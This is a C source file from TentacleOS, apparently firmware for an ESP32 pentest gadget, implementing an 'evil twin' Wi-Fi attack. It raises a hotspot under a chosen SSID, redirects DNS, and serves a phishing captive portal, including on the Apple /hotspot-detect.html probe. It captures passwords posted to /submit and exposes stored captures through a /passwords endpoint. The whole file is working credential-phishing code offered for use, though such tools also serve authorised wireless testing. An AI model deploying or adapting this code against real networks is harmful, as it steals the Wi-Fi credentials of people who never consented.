// Copyright (c) 2025 HIGH CODE LLC
//
// TentacleOS is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// TentacleOS is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with TentacleOS. If not, see <https://www.gnu.org/licenses/>.

#include "evil_twin.h"

#include <stdlib.h>
#include <string.h>

#include "esp_err.h"
#include "esp_log.h"
#include "freertos/FreeRTOS.h"
#include "freertos/semphr.h"

#include "cJSON.h"
#include "dns_server.h"
#include "http_server_service.h"
#include "storage_assets.h"
#include "storage_impl.h"
#include "storage_read.h"
#include "storage_write.h"
#include "tos_flash_paths.h"
#include "wifi_service.h"

static const char *TAG = "EVIL_TWIN";

#define PATH_HTML_INDEX           FLASH_CAPTIVE_HTML_INDEX
#define PATH_HTML_THANKS          FLASH_CAPTIVE_HTML_THANKS
#define PATH_PASSWORDS_REL        "storage/captive_portal/passwords.json"
#define PATH_PASSWORDS_ABS        FLASH_STORAGE_CAPTIVE_PASS
#define TMPL_BUF_MAX              (8 * 1024)
#define STORAGE_MUTEX_TIMEOUT_MS  5000
#define PASSWORD_MUTEX_TIMEOUT_MS 2000
#define ATTACK_START_DELAY_MS     1000
#define MAX_PASSWORD_LEN          64

static SemaphoreHandle_t s_storage_mutex = NULL;
static const char *s_current_template_path = PATH_HTML_INDEX;
static bool s_has_password = false;
static char s_last_password[MAX_PASSWORD_LEN];

static char *s_uploaded_template = NULL;
static size_t s_uploaded_template_size = 0;
static size_t s_uploaded_template_offset = 0;

static void init_storage_mutex(void);
static esp_err_t submit_post_handler(httpd_req_t *req);
static esp_err_t passwords_get_handler(httpd_req_t *req);
static esp_err_t captive_portal_get_handler(httpd_req_t *req);
static void register_evil_twin_handlers(void);

void evil_twin_start_attack(const char *ssid) {
  evil_twin_start_attack_with_template(ssid, PATH_HTML_INDEX);
}

void evil_twin_start_attack_with_template(const char *ssid, const char *template_path) {
  init_storage_mutex();
  ESP_LOGI(TAG, "Starting Evil Twin: %s", ssid);

  if (!storage_assets_is_mounted()) {
    storage_assets_init();
  }

  s_current_template_path =
      (template_path != NULL && template_path[0] != '\0') ? template_path : PATH_HTML_INDEX;
  s_has_password = false;
  s_last_password[0] = '\0';

  wifi_service_change_to_hotspot(ssid);
  start_dns_server();
  vTaskDelay(pdMS_TO_TICKS(ATTACK_START_DELAY_MS));

  register_evil_twin_handlers();
  ESP_LOGI(TAG, "Attack active and Mutex ready.");
}

void evil_twin_stop_attack(void) {
  stop_http_server();
  stop_dns_server();
  if (s_storage_mutex != NULL) {
    vSemaphoreDelete(s_storage_mutex);
    s_storage_mutex = NULL;
  }
  ESP_LOGI(TAG, "Evil Twin logic stopped.");
}

void evil_twin_reset_capture(void) {
  s_has_password = false;
  s_last_password[0] = '\0';
}

bool evil_twin_has_password(void) {
  return s_has_password;
}

void evil_twin_get_last_password(char *out, size_t len) {
  if (out == NULL || len == 0)
    return;
  strncpy(out, s_last_password, len - 1);
  out[len - 1] = '\0';
}

void evil_twin_tmpl_begin(uint16_t total_size) {
  if (s_uploaded_template != NULL) {
    free(s_uploaded_template);
    s_uploaded_template = NULL;
  }
  if (total_size == 0 || total_size > TMPL_BUF_MAX) {
    ESP_LOGE(TAG, "Template size invalid: %u", total_size);
    return;
  }
  s_uploaded_template = malloc(total_size + 1);
  if (s_uploaded_template == NULL) {
    ESP_LOGE(TAG, "Failed to allocate template buffer");
    return;
  }
  s_uploaded_template_size = total_size;
  s_uploaded_template_offset = 0;
  ESP_LOGI(TAG, "Template upload started: %u bytes", total_size);
}

void evil_twin_tmpl_chunk(const uint8_t *data, uint8_t len) {
  if (s_uploaded_template == NULL || data == NULL || len == 0)
    return;
  size_t remaining = s_uploaded_template_size - s_uploaded_template_offset;
  size_t to_copy = (len > remaining) ? remaining : len;
  memcpy(s_uploaded_template + s_uploaded_template_offset, data, to_copy);
  s_uploaded_template_offset += to_copy;
  if (s_uploaded_template_offset >= s_uploaded_template_size) {
    s_uploaded_template[s_uploaded_template_size] = '\0';
    ESP_LOGI(TAG, "Template upload complete: %u bytes", (unsigned)s_uploaded_template_size);
  }
}

static void init_storage_mutex(void) {
  if (s_storage_mutex == NULL) {
    s_storage_mutex = xSemaphoreCreateMutex();
  }
}

static esp_err_t submit_post_handler(httpd_req_t *req) {
  char buf[256];
  int ret = httpd_req_recv(req, buf, sizeof(buf) - 1);
  if (ret <= 0)
    return ESP_FAIL;
  buf[ret] = '\0';

  char password[MAX_PASSWORD_LEN] = {0};
  if (http_service_query_key_value(buf, "password", password, sizeof(password)) == ESP_OK) {
    // Keep the captured password in RAM only. The P4 pulls it over SPI
    // (SPI_ID_WIFI_EVIL_TWIN_GET_PASSWORD) and persists it on its SD; the C5
    // does not write captures to its own storage.
    strncpy(s_last_password, password, sizeof(s_last_password) - 1);
    s_last_password[sizeof(s_last_password) - 1] = '\0';
    s_has_password = true;
    ESP_LOGI(TAG, "Password captured (held in RAM for P4 pull)");
  }

  size_t size = 0;
  char *thanks = (char *)storage_assets_load_file(PATH_HTML_THANKS, &size);
  if (thanks != NULL) {
    http_service_send_response(req, thanks, HTTPD_RESP_USE_STRLEN);
    free(thanks);
  } else {
    http_service_send_error(req, HTTP_STATUS_NOT_FOUND_404, "Thank you HTML not found");
    return ESP_FAIL;
  }

  return ESP_OK;
}

static esp_err_t passwords_get_handler(httpd_req_t *req) {
  init_storage_mutex();

  if (xSemaphoreTake(s_storage_mutex, pdMS_TO_TICKS(PASSWORD_MUTEX_TIMEOUT_MS)) == pdTRUE) {
    size_t size = 0;
    char *json_data = (char *)storage_assets_load_file(PATH_PASSWORDS_REL, &size);
    xSemaphoreGive(s_storage_mutex);

    if (json_data != NULL) {
      httpd_resp_set_type(req, "application/json");
      http_service_send_response(req, json_data, HTTPD_RESP_USE_STRLEN);
      free(json_data);
      return ESP_OK;
    }
  }

  // Returns empty array if no file exists
  http_service_send_response(req, "[]", HTTPD_RESP_USE_STRLEN);
  return ESP_OK;
}

static esp_err_t captive_portal_get_handler(httpd_req_t *req) {
  // Serve from uploaded RAM buffer if available
  if (s_uploaded_template != NULL && s_uploaded_template_offset >= s_uploaded_template_size) {
    http_service_send_response(req, s_uploaded_template, HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
  }

  // Fallback to flash asset
  size_t size = 0;
  const char *path = s_current_template_path != NULL ? s_current_template_path : PATH_HTML_INDEX;
  char *html = (char *)storage_assets_load_file(path, &size);
  if (html != NULL) {
    http_service_send_response(req, html, HTTPD_RESP_USE_STRLEN);
    free(html);
    return ESP_OK;
  }
  http_service_send_error(req, HTTP_STATUS_NOT_FOUND_404, "Portal HTML not found");
  return ESP_FAIL;
}

static void register_evil_twin_handlers(void) {
  start_web_server();
  httpd_uri_t submit_uri = {.uri = "/submit", .method = HTTP_POST, .handler = submit_post_handler};
  http_service_register_uri(&submit_uri);

  httpd_uri_t passwords_uri = {
      .uri = "/passwords", .method = HTTP_GET, .handler = passwords_get_handler};
  http_service_register_uri(&passwords_uri);

  httpd_uri_t root_uri = {.uri = "/", .method = HTTP_GET, .handler = captive_portal_get_handler};
  http_service_register_uri(&root_uri);

  httpd_uri_t captive_portal_uri = {.uri = "/hotspot-detect.html",
                                    .method = HTTP_GET,
                                    .handler = captive_portal_get_handler,
                                    .user_ctx = NULL};
  http_service_register_uri(&captive_portal_uri);
}
